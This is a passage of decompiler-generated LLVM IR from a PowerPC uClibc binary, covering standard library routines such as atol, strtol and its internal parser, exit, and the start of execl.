  %v1_1000ba30 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000ba30 = add i32 %v1_1000ba30, 20
  %v3_1000ba30 = inttoptr i32 %v2_1000ba30 to i32*
  store i32 %v4_1000ba28, i32* %v3_1000ba30, align 4
  %v0_1000ba34 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ba34 = mul i32 %v0_1000ba34, 4
  store i32 %v1_1000ba34, i32* %r0.global-to-local, align 4
  %v0_1000ba38 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000ba38 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000ba38 = add i32 %v1_1000ba38, 8
  %v3_1000ba38 = inttoptr i32 %v2_1000ba38 to i32*
  store i32 %v0_1000ba38, i32* %v3_1000ba38, align 4
  %v0_1000ba3c = load i32, i32* %r29.global-to-local, align 4
  %v1_1000ba3c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000ba3c = add i32 %v1_1000ba3c, %v0_1000ba3c
  store i32 %v2_1000ba3c, i32* %r0.global-to-local, align 4
  %v0_1000ba40 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ba40 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000ba40 = add i32 %v1_1000ba40, 16
  %v3_1000ba40 = inttoptr i32 %v2_1000ba40 to i32*
  store i32 %v0_1000ba40, i32* %v3_1000ba40, align 4
  %v0_1000ba44 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ba44 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000ba44 = add i32 %v1_1000ba44, 24
  %v3_1000ba44 = inttoptr i32 %v2_1000ba44 to i32*
  store i32 %v0_1000ba44, i32* %v3_1000ba44, align 4
  store i32 268483148, i32* @lr, align 4
  %v0_1000ba48 = call i32 @srandom_r()
  %v0_1000ba4c = load i32, i32* @r31, align 4
  %v3_1000ba4c = icmp eq i32 %v0_1000ba4c, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000ba58 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000ba58 = inttoptr i32 %v1_1000ba58 to i32*
  store i32 0, i32* %v2_1000ba58, align 4
  br i1 %v3_1000ba4c, label %dec_label_pc_1000ba90, label %dec_label_pc_1000ba60

dec_label_pc_1000ba60:                            ; preds = %dec_label_pc_1000ba1c
  %v0_1000ba60 = load i32, i32* @r30, align 4
  %v1_1000ba60 = add i32 %v0_1000ba60, 4
  %v2_1000ba60 = inttoptr i32 %v1_1000ba60 to i32*
  %v3_1000ba60 = load i32, i32* %v2_1000ba60, align 4
  %v0_1000ba64 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000ba64 = sub i32 %v3_1000ba60, %v0_1000ba64
  %v4_1000ba68 = sdiv i32 %v2_1000ba64, 4
  %v1_1000ba6c = mul i32 %v4_1000ba68, 5
  %v1_1000ba70 = load i32, i32* @r31, align 4
  %v2_1000ba70 = add i32 %v1_1000ba6c, %v1_1000ba70
  store i32 %v2_1000ba70, i32* %r0.global-to-local, align 4
  %v1_1000ba74 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000ba74 = inttoptr i32 %v1_1000ba74 to i32*
  store i32 %v2_1000ba70, i32* %v2_1000ba74, align 4
  br label %dec_label_pc_1000ba90

dec_label_pc_1000ba7c:                            ; preds = %dec_label_pc_1000ba10
  %v0_1000ba7c = call i32 @__errno_location()
  store i32 %v0_1000ba7c, i32* %r3.global-to-local, align 4
  %v0_1000ba80 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000ba80 = inttoptr i32 %v0_1000ba7c to i32*
  store i32 %v0_1000ba80, i32* %v2_1000ba80, align 4
  %v0_1000ba84 = call i32 @__errno_location()
  %v0_1000ba88 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000ba88 = inttoptr i32 %v0_1000ba84 to i32*
  store i32 %v0_1000ba88, i32* %v2_1000ba88, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ba90

dec_label_pc_1000ba90:                            ; preds = %dec_label_pc_1000ba1c, %dec_label_pc_1000ba60, %dec_label_pc_1000ba7c
  store i32 %v0_1000b9c4, i32* %r0.global-to-local, align 4
  %v0_1000baa0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000baa0

; uselistorder directives
  uselistorder i32 %v2_1000ba24, { 1, 0, 2 }
  uselistorder i32 %v0_1000ba1c, { 1, 0 }
  uselistorder i32 %v2_1000b9d0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 ()* @srandom_r, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100134f4.626 to i32), { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 4, 2, 0, 5, 3 }
  uselistorder label %dec_label_pc_1000ba90, { 2, 1, 0 }
}

define i32 @atol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  %v2_1000baac = call i32 @strtol(i32 0, i32 10)
  ret i32 %v2_1000baac
}

define i32 @strtol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 1, i32* @r6, align 4
  %v2_1000bab4 = call i32 @_stdlib_strto_l(i8* inttoptr (i32 1 to i8*))
  ret i32 %v2_1000bab4
}

define i32 @_stdlib_strto_l(i8* %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000bac8 = load i32, i32* @r4, align 4
  store i32 %v0_1000bac8, i32* @r25, align 4
  %v0_1000bad0 = load i32, i32* @r5, align 4
  store i32 %v0_1000bad0, i32* %r30.global-to-local, align 4
  %v0_1000bad4 = load i32, i32* @r6, align 4
  store i32 %v0_1000bad4, i32* @r26, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_1000badc = load i32, i32* @global_var_100249e8, align 4
  br label %dec_label_pc_1000bae8

dec_label_pc_1000bae4:                            ; preds = %dec_label_pc_1000bae8
  %v1_1000bae4 = add i32 %v0_1000bb1c, 1
  store i32 %v1_1000bae4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bae8

dec_label_pc_1000bae8:                            ; preds = %entry, %dec_label_pc_1000bae4
  %v0_1000bb1c = phi i32 [ %tmp, %entry ], [ %v1_1000bae4, %dec_label_pc_1000bae4 ]
  %v1_1000bae8 = inttoptr i32 %v0_1000bb1c to i8*
  %v2_1000bae8 = load i8, i8* %v1_1000bae8, align 1
  %v3_1000bae8 = zext i8 %v2_1000bae8 to i32
  %v1_1000baec = mul nuw nsw i32 %v3_1000bae8, 2
  %v2_1000baf0 = add i32 %v1_1000baec, %v3_1000badc
  %v3_1000baf0 = inttoptr i32 %v2_1000baf0 to i16*
  %v4_1000baf0 = load i16, i16* %v3_1000baf0, align 2
  %v1_1000baf4 = and i16 %v4_1000baf0, 32
  %v3_1000baf4 = icmp eq i16 %v1_1000baf4, 0
  br i1 %v3_1000baf4, label %dec_label_pc_1000bafc, label %dec_label_pc_1000bae4

dec_label_pc_1000bafc:                            ; preds = %dec_label_pc_1000bae8
  %v3_1000bafc = icmp eq i8 %v2_1000bae8, 43
  br i1 %v3_1000bafc, label %dec_label_pc_1000bb1c, label %dec_label_pc_1000bb04

dec_label_pc_1000bb04:                            ; preds = %dec_label_pc_1000bafc
  %v3_1000bb04 = icmp eq i8 %v2_1000bae8, 45
  store i32 0, i32* @r28, align 4
  br i1 %v3_1000bb04, label %dec_label_pc_1000bb1c, label %dec_label_pc_1000bb20

dec_label_pc_1000bb1c:                            ; preds = %dec_label_pc_1000bafc, %dec_label_pc_1000bb04
  %storemerge = phi i32 [ 1, %dec_label_pc_1000bb04 ], [ 0, %dec_label_pc_1000bafc ]
  store i32 %storemerge, i32* @r28, align 4
  %v1_1000bb1c = add i32 %v0_1000bb1c, 1
  store i32 %v1_1000bb1c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bb20

dec_label_pc_1000bb20:                            ; preds = %dec_label_pc_1000bb04, %dec_label_pc_1000bb1c
  %v1_1000bb20 = call i32 @__asm_rlwinm.(i32 %v0_1000bad0, i32 0, i32 28, i32 26)
  %v4_1000bb20 = icmp eq i32 %v1_1000bb20, 0
  br i1 %v4_1000bb20, label %dec_label_pc_1000bb2c, label %dec_label_pc_1000bb20.dec_label_pc_1000bb68_crit_edge

dec_label_pc_1000bb20.dec_label_pc_1000bb68_crit_edge: ; preds = %dec_label_pc_1000bb20
  %v0_1000bb68.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000bb68

dec_label_pc_1000bb2c:                            ; preds = %dec_label_pc_1000bb20
  %v0_1000bb2c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000bb2c = inttoptr i32 %v0_1000bb2c to i8*
  %v2_1000bb2c = load i8, i8* %v1_1000bb2c, align 1
  %v0_1000bb30 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000bb30 = add i32 %v0_1000bb30, 10
  store i32 %v1_1000bb30, i32* %r30.global-to-local, align 4
  %v3_1000bb34 = icmp eq i8 %v2_1000bb2c, 48
  br i1 %v3_1000bb34, label %dec_label_pc_1000bb3c, label %dec_label_pc_1000bb5c

dec_label_pc_1000bb3c:                            ; preds = %dec_label_pc_1000bb2c
  %v1_1000bb3c = add i32 %v0_1000bb2c, 1
  %v2_1000bb3c = inttoptr i32 %v1_1000bb3c to i8*
  %v3_1000bb3c = load i8, i8* %v2_1000bb3c, align 1
  %v4_1000bb3c = zext i8 %v3_1000bb3c to i32
  store i32 %v1_1000bb3c, i32* %r31.global-to-local, align 4
  %v1_1000bb40 = add i32 %v0_1000bb30, 8
  store i32 %v1_1000bb40, i32* %r30.global-to-local, align 4
  %v1_1000bb44 = or i32 %v4_1000bb3c, 32
  %v3_1000bb4c = icmp eq i32 %v1_1000bb44, 120
  br i1 %v3_1000bb4c, label %dec_label_pc_1000bb54, label %dec_label_pc_1000bb5c

dec_label_pc_1000bb54:                            ; preds = %dec_label_pc_1000bb3c
  %v1_1000bb54 = mul i32 %v1_1000bb40, 2
  store i32 %v1_1000bb54, i32* %r30.global-to-local, align 4
  %v1_1000bb58 = add i32 %v0_1000bb2c, 2
  store i32 %v1_1000bb58, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bb5c

dec_label_pc_1000bb5c:                            ; preds = %dec_label_pc_1000bb3c, %dec_label_pc_1000bb2c, %dec_label_pc_1000bb54
  %v0_1000bc1015 = phi i32 [ %v1_1000bb3c, %dec_label_pc_1000bb54 ], [ %tmp, %dec_label_pc_1000bb2c ], [ %v1_1000bb3c, %dec_label_pc_1000bb3c ]
  %v0_1000bb5c = phi i32 [ %v1_1000bb54, %dec_label_pc_1000bb54 ], [ %v1_1000bb30, %dec_label_pc_1000bb2c ], [ %v1_1000bb40, %dec_label_pc_1000bb3c ]
  %tmp22 = icmp slt i32 %v0_1000bb5c, 17
  br i1 %tmp22, label %dec_label_pc_1000bb68, label %dec_label_pc_1000bb64

dec_label_pc_1000bb64:                            ; preds = %dec_label_pc_1000bb5c
  store i32 16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000bb68

dec_label_pc_1000bb68:                            ; preds = %dec_label_pc_1000bb20.dec_label_pc_1000bb68_crit_edge, %dec_label_pc_1000bb5c, %dec_label_pc_1000bb64
  %v0_1000bc1014 = phi i32 [ %tmp, %dec_label_pc_1000bb20.dec_label_pc_1000bb68_crit_edge ], [ %v0_1000bc1015, %dec_label_pc_1000bb5c ], [ %v0_1000bc1015, %dec_label_pc_1000bb64 ]
  %v1_1000bb7c = phi i32 [ %v0_1000bb68.pre, %dec_label_pc_1000bb20.dec_label_pc_1000bb68_crit_edge ], [ %v0_1000bb5c, %dec_label_pc_1000bb5c ], [ 16, %dec_label_pc_1000bb64 ]
  %v1_1000bb68 = add i32 %v1_1000bb7c, -2
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1000bb70 = icmp ugt i32 %v1_1000bb68, 34
  br i1 %v2_1000bb70, label %dec_label_pc_1000bc08, label %dec_label_pc_1000bb78

dec_label_pc_1000bb78:                            ; preds = %dec_label_pc_1000bb68
  %v2_1000bb7c = udiv i32 -1, %v1_1000bb7c
  store i32 %v2_1000bb7c, i32* @r29, align 4
  %v2_1000bb80 = mul i32 %v2_1000bb7c, %v1_1000bb7c
  %v1_1000bb84 = sub i32 -1, %v2_1000bb80
  %v1_1000bb88 = urem i32 %v1_1000bb84, 256
  store i32 %v1_1000bb88, i32* @r27, align 4
  %v0_1000bb94.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bb94

dec_label_pc_1000bb90:                            ; preds = %dec_label_pc_1000bbfc, %dec_label_pc_1000bbe4
  %v1_1000bb98.pre = phi i32 [ %v1_1000bb9c, %dec_label_pc_1000bbfc ], [ %v1_1000bb98.pre.pre, %dec_label_pc_1000bbe4 ]
  %v0_1000bb98.pre = phi i32 [ %v2_1000bc00, %dec_label_pc_1000bbfc ], [ %v0_1000bb98.pre.pre, %dec_label_pc_1000bbe4 ]
  %v0_1000bb90 = phi i32 [ %v1_1000bba0, %dec_label_pc_1000bbfc ], [ %v0_1000bb90.pre, %dec_label_pc_1000bbe4 ]
  br label %dec_label_pc_1000bb94

dec_label_pc_1000bb94:                            ; preds = %dec_label_pc_1000bb78, %dec_label_pc_1000bb90
  %v0_1000bc1012 = phi i32 [ %v0_1000bc1014, %dec_label_pc_1000bb78 ], [ %v0_1000bb90, %dec_label_pc_1000bb90 ]
  %v0_1000bba0 = phi i32 [ %v0_1000bb94.pre, %dec_label_pc_1000bb78 ], [ %v0_1000bb90, %dec_label_pc_1000bb90 ]
  %v1_1000bb9c = phi i32 [ %v2_1000bb7c, %dec_label_pc_1000bb78 ], [ %v1_1000bb98.pre, %dec_label_pc_1000bb90 ]
  %v0_1000bbfc = phi i32 [ 0, %dec_label_pc_1000bb78 ], [ %v0_1000bb98.pre, %dec_label_pc_1000bb90 ]
  %v1_1000bb94 = inttoptr i32 %v0_1000bba0 to i8*
  %v2_1000bb94 = load i8, i8* %v1_1000bb94, align 1
  %v3_1000bb94 = zext i8 %v2_1000bb94 to i32
  %v3_1000bb98 = icmp ugt i32 %v0_1000bbfc, %v1_1000bb9c
  %v1_1000bba0 = add i32 %v0_1000bba0, 1
  store i32 %v1_1000bba0, i32* %r31.global-to-local, align 4
  %v1_1000bba4 = add nsw i32 %v3_1000bb94, -48
  %v1_1000bba8 = or i32 %v3_1000bb94, 32
  %v1_1000bbac = urem i32 %v1_1000bba4, 256
  %tmp23 = icmp ult i32 %v1_1000bbac, 10
  br i1 %tmp23, label %dec_label_pc_1000bbcc, label %dec_label_pc_1000bbbc

dec_label_pc_1000bbbc:                            ; preds = %dec_label_pc_1000bb94
  %tmp24 = icmp ult i32 %v1_1000bba8, 97
  br i1 %tmp24, label %dec_label_pc_1000bbcc, label %dec_label_pc_1000bbc8

dec_label_pc_1000bbc8:                            ; preds = %dec_label_pc_1000bbbc
  %v1_1000bbbc = add nsw i32 %v1_1000bba8, -87
  %v1_1000bbc8 = urem i32 %v1_1000bbbc, 256
  br label %dec_label_pc_1000bbcc

dec_label_pc_1000bbcc:                            ; preds = %dec_label_pc_1000bbbc, %dec_label_pc_1000bb94, %dec_label_pc_1000bbc8
  %v1_1000bc00 = phi i32 [ 40, %dec_label_pc_1000bbbc ], [ %v1_1000bbac, %dec_label_pc_1000bb94 ], [ %v1_1000bbc8, %dec_label_pc_1000bbc8 ]
  %v1_1000bbcc = load i32, i32* %r30.global-to-local, align 4
  %v2_1000bbcc = icmp slt i32 %v1_1000bc00, %v1_1000bbcc
  br i1 %v2_1000bbcc, label %dec_label_pc_1000bbd4, label %dec_label_pc_1000bc08

dec_label_pc_1000bbd4:                            ; preds = %dec_label_pc_1000bbcc
  br i1 %v3_1000bb98, label %dec_label_pc_1000bbe4, label %dec_label_pc_1000bbd8

dec_label_pc_1000bbd8:                            ; preds = %dec_label_pc_1000bbd4
  %v1_1000bbd8 = load i32, i32* @r27, align 4
  %v0_1000bbdc.not = icmp ne i32 %v0_1000bbfc, %v1_1000bb9c
  %tmp25 = icmp ule i32 %v1_1000bc00, %v1_1000bbd8
  %or.cond = or i1 %tmp25, %v0_1000bbdc.not
  br i1 %or.cond, label %dec_label_pc_1000bbfc, label %dec_label_pc_1000bbe4

dec_label_pc_1000bbe4:                            ; preds = %dec_label_pc_1000bbd8, %dec_label_pc_1000bbd4
  %v0_1000bbe4 = call i32 @__errno_location()
  %v0_1000bbe8 = load i32, i32* @r28, align 4
  %v1_1000bbe8 = load i32, i32* @r26, align 4
  %v2_1000bbe8 = and i32 %v1_1000bbe8, %v0_1000bbe8
  store i32 %v2_1000bbe8, i32* @r28, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  %v2_1000bbf4 = inttoptr i32 %v0_1000bbe4 to i32*
  store i32 34, i32* %v2_1000bbf4, align 4
  %v0_1000bb90.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1000bb98.pre.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_1000bb98.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000bb90

dec_label_pc_1000bbfc:                            ; preds = %dec_label_pc_1000bbd8
  %v2_1000bbfc = mul i32 %v1_1000bbcc, %v0_1000bbfc
  %v2_1000bc00 = add i32 %v2_1000bbfc, %v1_1000bc00
  store i32 %v2_1000bc00, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000bb90

dec_label_pc_1000bc08:                            ; preds = %dec_label_pc_1000bbcc, %dec_label_pc_1000bb68
  %v0_1000bc10 = phi i32 [ %v0_1000bc1014, %dec_label_pc_1000bb68 ], [ %v0_1000bc1012, %dec_label_pc_1000bbcc ]
  %v0_1000bc08 = load i32, i32* @r25, align 4
  %v3_1000bc08 = icmp eq i32 %v0_1000bc08, 0
  br i1 %v3_1000bc08, label %dec_label_pc_1000bc14, label %dec_label_pc_1000bc10

dec_label_pc_1000bc10:                            ; preds = %dec_label_pc_1000bc08
  %v2_1000bc10 = inttoptr i32 %v0_1000bc08 to i32*
  store i32 %v0_1000bc10, i32* %v2_1000bc10, align 4
  br label %dec_label_pc_1000bc14

dec_label_pc_1000bc14:                            ; preds = %dec_label_pc_1000bc08, %dec_label_pc_1000bc10
  %v0_1000bc14 = load i32, i32* @r26, align 4
  %v3_1000bc14 = icmp eq i32 %v0_1000bc14, 0
  %v0_1000bc18 = load i32, i32* @r28, align 4
  %v1_1000bc18 = sub i32 0, %v0_1000bc18
  %tmp27 = lshr i32 %v1_1000bc18, 31
  %tmp28 = add nuw i32 %tmp27, 2147483647
  store i32 %tmp28, i32* @r31, align 4
  %v0_1000bc58.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v3_1000bc14, label %dec_label_pc_1000bc48, label %dec_label_pc_1000bc30

dec_label_pc_1000bc30:                            ; preds = %dec_label_pc_1000bc14
  %v3_1000bc30 = icmp ugt i32 %v0_1000bc58.pre.pre, %tmp28
  br i1 %v3_1000bc30, label %dec_label_pc_1000bc38, label %dec_label_pc_1000bc48

dec_label_pc_1000bc38:                            ; preds = %dec_label_pc_1000bc30
  %v0_1000bc38 = call i32 @__errno_location()
  %v2_1000bc40 = inttoptr i32 %v0_1000bc38 to i32*
  store i32 34, i32* %v2_1000bc40, align 4
  %v0_1000bc44 = load i32, i32* @r31, align 4
  store i32 %v0_1000bc44, i32* %r8.global-to-local, align 4
  %v0_1000bc48.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000bc48

dec_label_pc_1000bc48:                            ; preds = %dec_label_pc_1000bc14, %dec_label_pc_1000bc30, %dec_label_pc_1000bc38
  %v0_1000bc58.pre = phi i32 [ %v0_1000bc58.pre.pre, %dec_label_pc_1000bc30 ], [ %v0_1000bc44, %dec_label_pc_1000bc38 ], [ %v0_1000bc58.pre.pre, %dec_label_pc_1000bc14 ]
  %v0_1000bc48 = phi i32 [ %v0_1000bc18, %dec_label_pc_1000bc30 ], [ %v0_1000bc48.pre, %dec_label_pc_1000bc38 ], [ %v0_1000bc18, %dec_label_pc_1000bc14 ]
  %v3_1000bc48 = icmp eq i32 %v0_1000bc48, 0
  br i1 %v3_1000bc48, label %dec_label_pc_1000bc54, label %dec_label_pc_1000bc50

dec_label_pc_1000bc50:                            ; preds = %dec_label_pc_1000bc48
  %v1_1000bc50 = sub i32 0, %v0_1000bc58.pre
  store i32 %v1_1000bc50, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000bc54

dec_label_pc_1000bc54:                            ; preds = %dec_label_pc_1000bc48, %dec_label_pc_1000bc50
  %v0_1000bc58 = phi i32 [ %v1_1000bc50, %dec_label_pc_1000bc50 ], [ %v0_1000bc58.pre, %dec_label_pc_1000bc48 ]
  ret i32 %v0_1000bc58

; uselistorder directives
  uselistorder i32 %v0_1000bc58.pre, { 1, 0 }
  uselistorder i32 %v0_1000bc58.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_1000bc00, { 1, 0 }
  uselistorder i32 %v1_1000bbac, { 1, 0 }
  uselistorder i32 %v1_1000bba8, { 1, 0 }
  uselistorder i32 %v1_1000bba0, { 1, 0 }
  uselistorder i32 %v3_1000bb94, { 1, 0 }
  uselistorder i32 %v0_1000bbfc, { 1, 0, 2 }
  uselistorder i32 %v1_1000bb9c, { 0, 2, 1 }
  uselistorder i32 %v0_1000bb90, { 1, 0 }
  uselistorder i32 %v2_1000bb7c, { 1, 0, 2 }
  uselistorder i32 %v1_1000bb54, { 1, 0 }
  uselistorder i32 %v1_1000bb40, { 1, 0, 2 }
  uselistorder i32 %v0_1000bb1c, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 2, 3, 4, 6 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 7, 2, 3, 6, 4, 5, 8 }
  uselistorder i32* %r30.global-to-local, { 4, 1, 0, 2, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_1000bc54, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc48, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000bc14, { 1, 0 }
  uselistorder label %dec_label_pc_1000bbcc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000bb94, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb68, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000bb5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000bb20, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb1c, { 1, 0 }
  uselistorder label %dec_label_pc_1000bae8, { 1, 0 }
}

define i32 @__GI_exit() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000bc84 = ptrtoint i32* %stack_var_-40 to i32
  %v0_1000bc90 = load i32, i32* @r3, align 4
  store i32 %v0_1000bc90, i32* @r31, align 4
  store i32 %v2_1000bc84, i32* @r3, align 4
  %v0_1000bc9c = call i32 @__pthread_return_void()
  %v0_1000bca4 = call i32 @__pthread_return_0()
  %v3_1000bcac = load i32, i32* @global_var_10024a64.630, align 4
  %v3_1000bcb0 = icmp eq i32 %v3_1000bcac, 0
  br i1 %v3_1000bcb0, label %dec_label_pc_1000bcc4, label %dec_label_pc_1000bcb8

dec_label_pc_1000bcb8:                            ; preds = %entry
  %v0_1000bcb8 = load i32, i32* @r31, align 4
  %v3_1000bcc0 = call i32 @unknown_0(i32 %v0_1000bcb8, i32 268566528)
  br label %dec_label_pc_1000bcc4

dec_label_pc_1000bcc4:                            ; preds = %entry, %dec_label_pc_1000bcb8
  store i32 %v2_1000bc84, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_1000bccc = call i32 @__pthread_return_void()
  store i32 %v0_1000bccc, i32* @r3, align 4
  store i32 268483796, i32* @lr, align 4
  %v1_1000bcd0 = call i32 @__GI___uClibc_fini(i32 %v0_1000bccc)
  br i1 icmp eq (i32 add (i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32), i32 -31372), i32 0), label %dec_label_pc_1000bce8, label %dec_label_pc_1000bce4

dec_label_pc_1000bce4:                            ; preds = %dec_label_pc_1000bcc4
  store i32 268483816, i32* @lr, align 4
  %v2_1000bce4 = call i32 @_stdio_term(i32 %v1_1000bcd0, i32 add (i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32), i32 -31372))
  br label %dec_label_pc_1000bce8

dec_label_pc_1000bce8:                            ; preds = %dec_label_pc_1000bcc4, %dec_label_pc_1000bce4
  %v0_1000bce8 = load i32, i32* @r31, align 4
  %v1_1000bcec = call i32 @__GI__exit(i32 %v0_1000bce8)
  ret i32 %v1_1000bcec

; uselistorder directives
  uselistorder label %dec_label_pc_1000bce8, { 1, 0 }
  uselistorder label %dec_label_pc_1000bcc4, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000bcf0 = ptrtoint i32* %stack_var_0 to i32
  %v2_1000bd0c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000bd0c, i32* %r0.global-to-local, align 4
  %v2_1000bd14 = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_1000bd0c, i32* %stack_var_-48, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000bd40

dec_label_pc_1000bd40:                            ; preds = %dec_label_pc_1000bd70, %entry
  %v0_1000bd44 = phi i32 [ 0, %entry ], [ %v1_1000bd44, %dec_label_pc_1000bd70 ]
  %stack_var_-52.0 = phi i32 [ %v2_1000bd14, %entry ], [ %stack_var_-52.1, %dec_label_pc_1000bd70 ]
  %stack_var_-56.0 = phi i8 [ 2, %entry ], [ %stack_var_-56.1, %dec_label_pc_1000bd70 ]
  %v4_1000bd40 = zext i8 %stack_var_-56.0 to i32
  %v1_1000bd44 = add i32 %v0_1000bd44, 1
  %v1_1000bd4c = mul nuw nsw i32 %v4_1000bd40, 4
  store i32 %v1_1000bd4c, i32* %r0.global-to-local, align 4
  %v2_1000bd50 = add i32 %v1_1000bd4c, %v2_1000bd0c
  store i32 %v2_1000bd50, i32* %r11.global-to-local, align 4
  %tmp19 = icmp ugt i8 %stack_var_-56.0, 7
  br i1 %tmp19, label %dec_label_pc_1000bd64, label %dec_label_pc_1000bd5c

dec_label_pc_1000bd5c:                            ; preds = %dec_label_pc_1000bd40
  %v1_1000bd54 = add i8 %stack_var_-56.0, 1
  br label %dec_label_pc_1000bd70

dec_label_pc_1000bd64:                            ; preds = %dec_label_pc_1000bd40
  store i32 %stack_var_-52.0, i32* %r11.global-to-local, align 4
  %v1_1000bd68 = add i32 %stack_var_-52.0, 4
  store i32 %v1_1000bd68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000bd70

dec_label_pc_1000bd70:                            ; preds = %dec_label_pc_1000bd5c, %dec_label_pc_1000bd64
  %stack_var_-52.1 = phi i32 [ %v1_1000bd68, %dec_label_pc_1000bd64 ], [ %stack_var_-52.0, %dec_label_pc_1000bd5c ]
  %v0_1000bd70 = phi i32 [ %stack_var_-52.0, %dec_label_pc_1000bd64 ], [ %v2_1000bd50, %dec_label_pc_1000bd5c ]
  %stack_var_-56.1 = phi i8 [ %stack_var_-56.0, %dec_label_pc_1000bd64 ], [ %v1_1000bd54, %dec_label_pc_1000bd5c ]
  %v1_1000bd70 = inttoptr i32 %v0_1000bd70 to i32*
  %v2_1000bd70 = load i32, i32* %v1_1000bd70, align 4
  store i32 %v2_1000bd70, i32* %r0.global-to-local, align 4
  %v3_1000bd74 = icmp eq i32 %v2_1000bd70, 0
  br i1 %v3_1000bd74, label %dec_label_pc_1000bd7c, label %dec_label_pc_1000bd40

dec_label_pc_1000bd7c:                            ; preds = %dec_label_pc_1000bd70
  %v1_1000bd7c = mul i32 %v1_1000bd44, 4
  store i32 %v4_1000bcf0, i32* %r0.global-to-local, align 4
  %v1_1000bd84 = add i32 %v1_1000bd7c, 34
  store i32 %v1_1000bd44, i32* %ctr.global-to-local, align 4
  %v1_1000bd8c = call i32 @__asm_rlwinm(i32 %v1_1000bd84, i32 0, i32 0, i32 27)
  %v1_1000bd94 = load i32, i32* @r1, align 4
  %v3_1000bd94 = sub i32 %v1_1000bd94, %v1_1000bd8c
  %v4_1000bd94 = inttoptr i32 %v3_1000bd94 to i32*
  store i32 %v4_1000bcf0, i32* %v4_1000bd94, align 4
  %v1_1000bd98 = add i32 %v3_1000bd94, 23
  store i32 %v1_1000bd98, i32* %r0.global-to-local, align 4
  %v1_1000bd9c = call i32 @__asm_rlwinm(i32 %v1_1000bd98, i32 0, i32 0, i32 27)
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1000bda4 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000bda4 = inttoptr i32 %v1_1000bd9c to i32*
  store i32 %v0_1000bda4, i32* %v2_1000bda4, align 4
  store i32 %v1_1000bd9c, i32* %r11.global-to-local, align 4
  %v0_1000bdac = load i32, i32* %r0.global-to-local, align 4
  %v1_1000bdac = trunc i32 %v0_1000bdac to i8
